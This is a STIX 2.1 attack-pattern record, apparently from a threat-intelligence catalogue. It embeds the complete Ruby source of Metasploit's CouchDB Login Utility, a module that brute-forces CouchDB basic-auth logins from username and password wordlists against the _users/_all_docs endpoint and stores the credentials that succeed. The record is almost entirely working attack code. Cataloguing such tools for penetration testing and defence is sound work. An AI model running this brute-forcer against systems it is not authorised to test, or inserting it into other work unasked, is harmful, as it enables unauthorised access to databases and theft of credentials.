{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d5f2eed6-764a-45b5-b3c8-f37311e8ef24",
    "created": "2024-08-14T16:31:22.455491Z",
    "modified": "2024-08-14T16:31:22.455494Z",
    "name": "CouchDB Login Utility",
    "description": " This module tests CouchDB logins on a range of machines and report successful logins. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/couchdb/couchdb_login.rb",
            "external_id": "couchdb_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'CouchDB Login Utility',\n      'Description'    => %{\n        This module tests CouchDB logins on a range of\n        machines and report successful logins.\n      },\n      'Author'         =>\n        [\n          'espreto <robertoespreto[at]gmail.com>'\n        ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(5984),\n        OptString.new('TARGETURI', [false, \"TARGETURI for CouchDB. Default here is /\", \"/\"]),\n        OptPath.new('USERPASS_FILE',  [ false, \"File containing users and passwords separated by space, one pair per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_userpass.txt\") ]),\n        OptPath.new('USER_FILE',  [ false, \"File containing users, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_users.txt\") ]),\n        OptPath.new('PASS_FILE',  [ false, \"File containing passwords, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_pass.txt\") ]),\n        OptBool.new('USER_AS_PASS', [ false, \"Try the username as the password for all users\", false]),\n      ])\n\n    deregister_options('HttpUsername', 'HttpPassword')\n  end\n\n  def run_host(ip)\n\n    user = datastore['HttpUsername'].to_s\n    pass = datastore['HttpPassword'].to_s\n\n    if user.nil? || user.strip == ''\n      each_user_pass do |user, pass|\n        do_login(user, pass)\n      end\n      return\n    end\n\n    vprint_status(\"#{rhost}:#{rport} - Trying to login with '#{user}' : '#{pass}'\")\n\n      uri = target_uri.path\n\n      res = send_request_cgi({\n        'uri'    => normalize_uri(uri, '_users/_all_docs'),\n        'method' => 'GET',\n        'authorization' => basic_auth(user, pass)\n      })\n\n      return if res.nil?\n      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /CouchDB/)\n      return if (res.code == 404)\n\n      if [200, 301, 302].include?(res.code)\n        vprint_good(\"#{rhost}:#{rport} - Successful login with '#{user}' : '#{pass}'\")\n      end\n\n    rescue ::Rex::ConnectionError\n      vprint_error(\"'#{rhost}':'#{rport}' - Failed to connect to the web server\")\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_login(user, pass)\n    vprint_status(\"Trying username:'#{user}' with password:'#{pass}'\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '_users/_all_docs'),\n      'method' => 'GET',\n      'ctype' => 'text/plain',\n      'authorization' => basic_auth(user, pass)\n    })\n\n    unless res\n      print_error('HTTP connection failed, aborting')\n      return :abort\n    end\n\n    return :skip_pass unless res.code == 200\n\n    print_good(\"#{peer} - Successful login with: '#{user}' : '#{pass}'\")\n\n    report_cred(\n      ip: rhost,\n      port: rport,\n      service_name: 'couchdb',\n      user: user,\n      password: pass,\n      proof: res.code.to_s\n    )\n\n    :next_user\n  rescue ::Rex::ConnectionError, ::Errno::ECONNREFUSED, ::Errno::ETIMEDOUT\n    print_error('HTTP connection failed, aborting')\n    return :abort\n  rescue => e\n    print_error(\"Error: #{e}\")\n    return nil\n  end\nend\n"
}